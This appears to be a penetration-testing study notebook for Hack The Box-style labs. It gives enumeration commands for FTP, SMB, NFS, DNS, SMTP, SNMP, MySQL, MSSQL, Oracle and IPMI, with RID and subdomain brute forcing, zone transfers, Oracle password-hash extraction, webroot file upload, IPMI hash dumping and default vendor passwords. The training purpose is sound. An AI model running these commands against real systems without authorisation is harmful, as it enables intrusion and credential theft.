
## 1.FTP / TFTP 21 / 2121

| **Commands** | **Description**                                                                                                                        |
| ------------ | -------------------------------------------------------------------------------------------------------------------------------------- |
| `connect`    | Sets the remote host, and optionally the port, for file transfers.                                                                     |
| `get`        | Transfers a file or set of files from the remote host to the local host.                                                               |
| `put`        | Transfers a file or set of files from the local host onto the remote host.                                                             |
| `quit`       | Exits tftp.                                                                                                                            |
| `status`     | Shows the current status of tftp, including the current transfer mode (ascii or binary), connection status, time-out value, and so on. |
| `verbose`    | Turns verbose mode, which displays additional information during file transfer, on or off.                                             |

### Default Configuration

```shell-session
sudo apt install vsftpd 
cat /etc/vsftpd.conf | grep -v "#"
cat /etc/ftpusers
```

### Dangerous Settings

| **Setting**                    | **Description**                                                                    |
| ------------------------------ | ---------------------------------------------------------------------------------- |
| `anonymous_enable=YES`         | Allowing anonymous login?                                                          |
| `anon_upload_enable=YES`       | Allowing anonymous to upload files?                                                |
| `anon_mkdir_write_enable=YES`  | Allowing anonymous to create new directories?                                      |
| `no_anon_password=YES`         | Do not ask anonymous for password?                                                 |
| `anon_root=/home/username/ftp` | Directory for anonymous.                                                           |
| `write_enable=YES`             | Allow the usage of FTP commands: STOR, DELE, RNFR, RNTO, MKD, RMD, APPE, and SITE? |

### Check Anonymous Login

{% code overflow="wrap" %}

```powershell
 ftp 10.129.14.136
 # username:passwd
 anonymous:anonymous
 ftp> status
 ftp> trace
 ftp> debug # server show more info
 ftp> ls -R # Recursive Listing
 
 
# Download a File
ftp> get Important\ Notes.txt 

# Download All Available Files
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136 


# Folder-Tree
tree .


# Upload a File
touch testupload.txt
ftp> put testupload.txt 
```

{% endcode %}

## Footprinting the Service

**scripts located /usr/share/nmap/scripts/**

```
 sudo nmap --script-updatedb
```

```shell-session
find / -type f -name ftp* 2>/dev/null | grep scripts
```

### Nmap Scan

```shell-session
sudo nmap -sV -p21 -sC -A 10.129.14.136
```

### **Nmap Script Trace**

```shell-session
sudo nmap -sV -p21 -sC -A 10.129.14.136 --script-trace
```

### **Service Interaction : Nc / Telnet**

```shell-session
nc -nv 10.129.14.136 21
```

```shell-session
telnet 10.129.14.136 21
```

***

### FTP server runs with TLS/SSL encryption

```shell-session
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

***

## 2. SMB / SAMBA `137 138 139 and 445`       &#x20;

### Default Configuration

```shell-session
cat /etc/samba/smb.conf | grep -v "#\|\;" 
```

### Dangerous Settings

| **Setting**                 | **Description**                                                     |
| --------------------------- | ------------------------------------------------------------------- |
| `browseable = yes`          | Allow listing available shares in the current share?                |
| `read only = no`            | Forbid the creation and modification of files?                      |
| `writable = yes`            | Allow users to create and modify files?                             |
| `guest ok = yes`            | Allow connecting to the service without using a password?           |
| `enable privileges = yes`   | Honor privileges assigned to specific SID?                          |
| `create mask = 0777`        | What permissions must be assigned to the newly created files?       |
| `directory mask = 0777`     | What permissions must be assigned to the newly created directories? |
| `logon script = script.sh`  | What script needs to be executed on the user's login?               |
| `magic script = script.sh`  | Which script should be executed when the script gets closed?        |
| `magic output = script.out` | Where the output of the magic script needs to be stored?            |

### Restart Samba

```shell-session
sudo systemctl restart smbd
```

### SMBclient - Connecting to the Share (Null)

```shell-session
smbclient -N -L //10.129.14.128
```

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FSw7v2PwcxUMgAdya0hbA%2Fimage.png?alt=media&amp;token=c85e52e1-c1fc-4c86-807e-4306453c107c" alt=""><figcaption></figcaption></figure>

```powershell
smbclient //10.129.14.128/notes
smb: \> help

# Download Files from SMB
smb: \> get prep-prod.txt 

# Samba Status
root@samba:~# smbstatus
```

## Footprinting the Service

```shell-session
 sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### RPCclient

{% embed url="<https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html>" %}

```shell-session
rpcclient -U "" 10.129.14.128
```

### RPC - Commands

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |

### RPCclient - Enumeration

```shell-session
rpcclient $> srvinfo

rpcclient $> enumdomains

rpcclient $> querydominfo

rpcclient $> netshareenumall

rpcclient $> netsharegetinfo notes
```

### Rpcclient - User Enumeration

```shell-session
rpcclient $> enumdomusers

user:[mrb3n] rid:[0x3e8]
user:[cry0l1t3] rid:[0x3e9]

rpcclient $> queryuser 0x3e9
rpcclient $> queryuser 0x3e8
```

### Rpcclient - Group Information

```shell-session
rpcclient $> querygroup 0x201
```

## Brute Forcing User RIDs

{% code overflow="wrap" %}

```shell-session
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
```

{% endcode %}

An alternative to this would be a Python script from [Impacket](https://github.com/SecureAuthCorp/impacket) called [samrdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py).

### Impacket - Samrdump.py

```shell-session
samrdump.py 10.129.14.128
```

The information we have already obtained with `rpcclient` can also be obtained using other tools.

### SMBMAP

```shell-session
smbmap -H 10.129.14.128
```

### CrackMapExec

```shell-session
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
```

Another tool worth mentioning is the so-called [enum4linux-ng](https://github.com/cddmp/enum4linux-ng), which is based on an older tool, enum4linux. This tool automates many of the queries

### Enum4Linux-ng - Installation

```powershell
# install
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

# Enum4Linux-ng - Enumeration
 ./enum4linux-ng.py 10.129.14.128 -A
```

***

## 3. NFS 111 / 2049

### Versions

| **Version** | **Features**                                                                                                                                                                                                                                                                       |
| ----------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `NFSv2`     | It is older but is supported by many systems and was initially operated entirely over UDP.                                                                                                                                                                                         |
| `NFSv3`     | It has more features, including variable file size and better error reporting, but is not fully compatible with NFSv2 clients.                                                                                                                                                     |
| `NFSv4`     | <p></p><p>It includes Kerberos, works through firewalls and on the Internet, no longer requires portmappers, supports ACLs, applies state-based operations, and provides performance improvements and high security. It is also the first version to have a stateful protocol.</p> |

### Default Configuration

```shell-session
cat /etc/exports 
```

| **Option**         | **Description**                                                                                                                             |
| ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------- |
| `rw`               | Read and write permissions.                                                                                                                 |
| `ro`               | Read only permissions.                                                                                                                      |
| `sync`             | Synchronous data transfer. (A bit slower)                                                                                                   |
| `async`            | Asynchronous data transfer. (A bit faster)                                                                                                  |
| `secure`           | Ports above 1024 will not be used.                                                                                                          |
| `insecure`         | Ports above 1024 will be used.                                                                                                              |
| `no_subtree_check` | This option disables the checking of subdirectory trees.                                                                                    |
| `root_squash`      | Assigns all permissions to files of root UID/GID 0 to the UID/GID of anonymous, which prevents `root` from accessing files on an NFS mount. |

### ExportFS

We have shared the folder `/mnt/nfs` to the subnet `10.129.14.0/24` with the setting shown above. This means that all hosts on the network will be able to mount this NFS share and inspect the contents of this folder.

```shell-session
root@nfs:~# echo '/mnt/nfs  10.129.14.0/24(sync,no_subtree_check)' >> /etc/exports
root@nfs:~# systemctl restart nfs-kernel-server 
root@nfs:~# exportfs
```

### Dangerous Settings

| **Option**       | **Description**                                                                                                      |
| ---------------- | -------------------------------------------------------------------------------------------------------------------- |
| `rw`             | Read and write permissions.                                                                                          |
| `insecure`       | Ports above 1024 will be used.                                                                                       |
| `nohide`         | If another file system was mounted below an exported directory, this directory is exported by its own exports entry. |
| `no_root_squash` | <p></p><p>All files created by root are kept with the UID/GID 0.</p>                                                 |

## Footprinting the Service

```shell-session
sudo nmap 10.129.14.128 -p111,2049 -sV -sC
sudo nmap --script nfs* 10.129.14.128 -sV -p111,2049
```

### Show Available NFS Shares

```shell-session
showmount -e 10.129.14.128
```

### **Mounting NFS Share**

```shell-session
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .
```

### List Contents with Usernames & Group Names

```shell-session
ls -l mnt/nfs/
```

### **List Contents with UIDs & GUIDs**

```shell-session
ls -n mnt/nfs/
```

It is important to note that if the `root_squash` option is set, we cannot edit the `backup.sh` file even as `root`.

### **Unmounting**

```shell-session
sudo umount ./target-NFS
```

## 4. DNS 53

### Server Types

| **Server Type**                | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `DNS Root Server`              | The root servers of the DNS are responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The [Internet Corporation for Assigned Names and Numbers](https://www.icann.org/) (`ICANN`) coordinates the work of the root name servers. There are `13` such root servers around the globe. |
| `Authoritative Nameserver`     | Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Based on the country, company, etc., authoritative nameservers provide answers to recursive DNS nameservers, assisting in finding the specific web server(s).                                              |
| `Non-authoritative Nameserver` | Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.                                                                                                                                                                                                                                                                               |
| `Caching DNS Server`           | Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.                                                                                                                                                                                                                                                                                                                             |
| `Forwarding Server`            | Forwarding servers perform only one function: they forward DNS queries to another DNS server.                                                                                                                                                                                                                                                                                                                                                                                            |
| `Resolver`                     | Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.                                                                                                                                                                                                                                                                                                                                                                               |

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FiT6vwv01L1CJCRK4JQGr%2Fimage.png?alt=media&amp;token=66332292-beeb-4fd8-af6b-93e09adbdee6" alt=""><figcaption></figcaption></figure>

### DNS Records

```shell-session
dig soa www.inlanefreight.com
```

| `A`     | Returns an IPv4 address of the requested domain as a result.                                                                                                                                                                                                                                |
| ------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `AAAA`  | Returns an IPv6 address of the requested domain.                                                                                                                                                                                                                                            |
| `MX`    | Returns the responsible mail servers as a result.                                                                                                                                                                                                                                           |
| `NS`    | Returns the DNS servers (nameservers) of the domain.                                                                                                                                                                                                                                        |
| `TXT`   | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.                                           |
| `CNAME` | This record serves as an alias for another domain name. If you want the domain [www.hackthebox.eu](http://www.hackthebox.eu) to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for [www.hackthebox.eu](http://www.hackthebox.eu). |
| `PTR`   | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.                                                                                                                                                                               |
| `SOA`   | Provides information about the corresponding DNS zone and email address of the administrative contact.                                                                                                                                                                                      |

### Default Configuration

There are many different configuration types for DNS.

1. local DNS configuration files
2. zone files
3. reverse name resolution files

* `named.conf.local`
* `named.conf.options`
* `named.conf.log`

```powershell
# Local DNS Configuration
cat /etc/bind/named.conf.local

# Zone Files
cat /etc/bind/db.domain.com

# Reverse Name Resolution Zone Files
cat /etc/bind/db.10.129.14
```

### Dangerous Settings

| **Option**        | **Description**                                                                |
| ----------------- | ------------------------------------------------------------------------------ |
| `allow-query`     | Defines which hosts are allowed to send requests to the DNS server.            |
| `allow-recursion` | Defines which hosts are allowed to send recursive requests to the DNS server.  |
| `allow-transfer`  | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| `zone-statistics` | Collects statistical data of zones.                                            |

## Footprinting the Service

### &#x20;**NS Query**

```shell-session
dig ns inlanefreight.htb @10.129.14.128
```

### &#x20;Version Query

```shell-session
dig CH TXT version.bind 10.129.120.85
```

### &#x20;ANY Query

```shell-session
dig any inlanefreight.htb @10.129.14.128
```

### AXFR Zone Transfer

```
dig axfr inlanefreight.htb @10.129.14.128
```

### AXFR Zone Transfer - Internal

```shell-session
dig axfr internal.inlanefreight.htb @10.129.14.128
```

The individual `A` records with the hostnames can also be found out with the help of a brute-force attack.

## **Subdomain Brute Forcing**

## One-Liner

{% embed url="<https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt>" %}

{% code overflow="wrap" %}

```shell-session
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

{% endcode %}

### Dnsenum

{% embed url="<https://github.com/fwaeytens/dnsenum>" %}

{% code overflow="wrap" %}

```shell-session
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

{% endcode %}

***

## 5. SMTP 25 / 587 / 465

### Default Configuration

```shell-session
cat /etc/postfix/main.cf | grep -v "#" | sed -r "/^\s*$/d"
```

### Commands

The sending and communication are also done by special commands that cause the SMTP server to do what the user requires.

| **Command**  | **Description**                                                                                  |
| ------------ | ------------------------------------------------------------------------------------------------ |
| `AUTH PLAIN` | AUTH is a service extension used to authenticate the client.                                     |
| `HELO`       | The client logs in with its computer name and thus starts the session.                           |
| `MAIL FROM`  | The client names the email sender.                                                               |
| `RCPT TO`    | The client names the email recipient.                                                            |
| `DATA`       | The client initiates the transmission of the email.                                              |
| `RSET`       | The client aborts the initiated transmission but keeps the connection between client and server. |
| `VRFY`       | The client checks if a mailbox is available for message transfer.                                |
| `EXPN`       | The client also checks if a mailbox is available for messaging with this command.                |
| `NOOP`       | The client requests a response from the server to prevent disconnection due to time-out.         |
| `QUIT`       | The client terminates the session.                                                               |

To interact with the SMTP server, we can use the `telnet` tool

### Telnet - HELO / EHLO

```shell-session
telnet 10.129.14.128 25

HELO mail1.inlanefreight.htb
EHLO mail1
```

### Telnet - VRFY

`VRFY` can be used to enumerate existing users on the system  `code 252` and confirm the existence of a user

{% embed url="<https://serversmtp.com/smtp-error/>" %}

```shell-session
telnet 10.129.14.128 25

VRFY root
VRFY cry0l1t3
VRFY testuser
VRFY aaaaaaaaaaaaaaaaaaaaaaaaaaaa

```

### Send an Email

```powershell
telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: <cry0l1t3@inlanefreight.htb>
RCPT TO: <mrb3n@inlanefreight.htb> # NOTIFY=success,failure
DATA
```

### Dangerous Settings

Open Relay Configuration

```shell-session
mynetworks = 0.0.0.0/0
```

## Footprinting the Service

```powershell
sudo nmap 10.129.14.128 -sC -sV -p25

# Powershell
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

***

## 6. IMAP / POP3  110 / 143 / 993 / 995&#x20;

### **IMAP Commands**

| **Command**                     | **Description**                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX`                | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox.                                                      |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

### **POP3 Commands**

| **Command**     | **Description**                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |

### Dangerous Settings

| **Setting**               | **Description**                                                                           |
| ------------------------- | ----------------------------------------------------------------------------------------- |
| `auth_debug`              | Enables all authentication debug logging.                                                 |
| `auth_debug_passwords`    | This setting adjusts log verbosity, the submitted passwords, and the scheme gets logged.  |
| `auth_verbose`            | Logs unsuccessful authentication attempts and their reasons.                              |
| `auth_verbose_passwords`  | Passwords used for authentication are logged and can also be truncated.                   |
| `auth_anonymous_username` | This specifies the username to be used when logging in with the ANONYMOUS SASL mechanism. |

## Footprinting the Service

```shell-session
sudo nmap 10.129.14.128 -sV -p110,143,993,995 -sC
```

### **cURL**

```shell-session
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user cry0l1t3:1234 -v
```

### OpenSSL - TLS Encrypted Interaction POP3

```shell-session
openssl s_client -connect 10.129.14.128:pop3s
```

### OpenSSL - TLS Encrypted Interaction IMAP

```shell-session
openssl s_client -connect 10.129.14.128:imaps
```

## 7. SNMP UDP 161 / 162&#x20;

### Default Configuration

```shell-session
cat /etc/snmp/snmpd.conf | grep -v "#" | sed -r '/^\s*$/d'
```

### Dangerous Settings

| **Settings**                                     | **Description**                                                                       |
| ------------------------------------------------ | ------------------------------------------------------------------------------------- |
| `rwuser noauth`                                  | Provides access to the full OID tree without authentication.                          |
| `rwcommunity <community string> <IPv4 address>`  | Provides access to the full OID tree regardless of where the requests were sent from. |
| `rwcommunity6 <community string> <IPv6 address>` | Same access as with `rwcommunity` with the difference of using IPv6.                  |

***

### MIB / OID / Community Strings

we can use tools like snmpwalk, onesixtyone, and braa. Snmpwalk is used to query the OIDs with their information.

#### MIB

MIB is an independent format for storing device information.

#### OID

An OID represents a node in a hierarchical namespace. A sequence of numbers uniquely identifies each node, allowing the node's position in the tree to be determined. The longer the chain, the more specific the information.

#### Community Strings

Community strings can be seen as passwords that are used to determine whether the requested information can be viewed or not.

## Footprinting the Service

```shell-session
snmpwalk -v2c -c public 10.129.14.128
```

### **OneSixtyOne**

```shell-session
sudo apt install onesixtyone
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

### Crunch Custom Wordlists

{% embed url="<https://secf00tprint.github.io/blog/passwords/crunch/advanced/en>" %}

Once we know a community string, we can use it with [braa](https://github.com/mteg/braa) to brute-force the individual OIDs and enumerate the information behind them.

## Braa : BruteForce

```shell-session
sudo apt install braa
braa <community string>@<IP>:.1.3.6.*   # Syntax
braa public@10.129.14.128:.1.3.6.*
```

***

## 8. MySQL

### Databases

[LAMP](https://en.wikipedia.org/wiki/LAMP_\(software_bundle\)) (Linux, Apache, MySQL, PHP)

when using Nginx, as [LEMP](https://lemp.io/)

### Default Configuration

{% code overflow="wrap" %}

```shell-session
sudo apt install mysql-server -y
cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
```

{% endcode %}

### Dangerous Settings

| **Settings**       | **Description**                                                                                              |
| ------------------ | ------------------------------------------------------------------------------------------------------------ |
| `user`             | Sets which user the MySQL service will run as.                                                               |
| `password`         | Sets the password for the MySQL user.                                                                        |
| `admin_address`    | The IP address on which to listen for TCP/IP connections on the administrative network interface.            |
| `debug`            | This variable indicates the current debugging settings                                                       |
| `sql_warnings`     | This variable controls whether single-row INSERT statements produce an information string if warnings occur. |
| `secure_file_priv` | This variable is used to limit the effect of data import and export operations.                              |

## Footprinting the Service

### Scan MySQL Server

```shell-session
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

### Interaction with MySQL Server

```shell-session
 mysql -u root -h 10.129.14.132
```

with passwd

```shell-session
 mysql -u root -pP4SSw0rd -h 10.129.14.128
```

```shell-session
MySQL [(none)]> show databases;  
MySQL [(none)]> select version();
MySQL [(none)]> use mysql;
MySQL [mysql]> show tables;
mysql> use sys;
mysql> show tables; 
```

{% embed url="<https://dev.mysql.com/doc/refman/8.0/en/system-schema.html>" %}

### Commands

| **Command**                                          | **Description**                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected table.                                                               |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

## 9. MSSQL 1433

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2FDO2XHMiAUGqT5ClrYpct%2Fimage.png?alt=media&amp;token=68402c79-9a64-4a32-bcd9-a88176b3c47f" alt=""><figcaption></figcaption></figure>

### MSSQL Clients

Many other clients can be used to access a database running on MSSQL. Including but not limited to:

|                                                                                         |                                                                                                                      |                                       |                                         |                                                                                                             |
| --------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------- | ------------------------------------- | --------------------------------------- | ----------------------------------------------------------------------------------------------------------- |
| [mssql-cli](https://docs.microsoft.com/en-us/sql/tools/mssql-cli?view=sql-server-ver15) | [SQL Server PowerShell](https://docs.microsoft.com/en-us/sql/powershell/sql-server-powershell?view=sql-server-ver15) | [HeidiSQL](https://www.heidisql.com/) | [SQLPro](https://www.macsqlclient.com/) | [Impacket's mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) |

```shell-session
locate mssqlclient
```

### &#x20;Databases

| `master`   | Tracks all system information for an SQL server instance                                                                                                                                               |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `model`    | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`     | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`   | Stores temporary objects                                                                                                                                                                               |
| `resource` | Read-only database containing system objects included with SQL server                                                                                                                                  |

### Default Configuration

<figure><img src="https://27438919-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FXIPxco87mgI3Ma3yEBLL%2Fuploads%2F5rQWbRkFQe69AJdgcLmx%2Fimage.png?alt=media&amp;token=591998ae-4e5e-4cf7-9e19-37bda181fcff" alt=""><figcaption></figcaption></figure>

### Dangerous Settings

* MSSQL clients not using encryption to connect to the MSSQL server
* The use of self-signed certificates when encryption is being used. It is possible to spoof self-signed certificates
* The use of [named pipes](https://docs.microsoft.com/en-us/sql/tools/configuration-manager/named-pipes-properties?view=sql-server-ver15)
* Weak & default `sa` credentials. Admins may forget to disable this account

## Footprinting the Service

{% code overflow="wrap" %}

```shell-session
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

{% endcode %}

We can also use Metasploit

```shell-session
msfconsole -q
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248
msf6 auxiliary(scanner/mssql/mssql_ping) > run
```

### Mssqlclient.py

```shell-session
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

```shell-session
SQL> select name from sys.databases
```

## 10. Oracle TNS 1521

### Setting UP

```shell-session
S4D3B@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
```

## Nmap

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open
```

### SID BRUTE-Force

```shell-session
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc.

## ODAT

```
./odat.py -h
./odat.py all -s 10.129.204.235
```

we found valid credentials for the user `scott` and his password `tiger`.&#x20;

## Sqlplus Login

```shell-session
sqlplus scott/tiger@10.129.204.235/XE
```

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

```shell-session
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

### Oracle RDBMS - Interaction

```shell-session
SQL> select table_name from all_tables;
SQL> select * from user_role_privs;
```

### Oracle RDBMS - Database Enumeration

```shell-session
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

### Oracle RDBMS - Extract Password Hashes

```shell-session
SQL> select name, password from sys.user$;
```

### PATH

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |

### Oracle RDBMS - File Upload

```shell-session
echo "Oracle File Upload Test" > testing.txt
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

### Curl

```shell-session
curl -X GET http://10.129.204.235/testing.txt
```

## 11. IPMI 623

IPMI is typically used in three ways:

* Before the OS has booted to modify BIOS settings
* When the host is fully powered down
* Access to a host after a system failure

## Footprinting the Service

```shell-session
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
```

### **Metasploit Version Scan**

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_version 
msf6 auxiliary(scanner/ipmi/ipmi_version) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_version) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_version) > run
```

### Default: Passwd

| Product         | Username      | Password                                                                  |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

### Dangerous Settings

If default credentials do not work to access a BMC, we can turn to a [flaw](http://fish2.com/ipmi/remote-pw-cracking.html) in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes place. This can be leveraged to obtain the password hash for ANY valid user account on the BMC. These password hashes can then be cracked offline using a dictionary attack using `Hashcat` mode `7300`.&#x20;

## Metasploit Dumping Hashes

```shell-session
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.42.195
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show options 
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
```
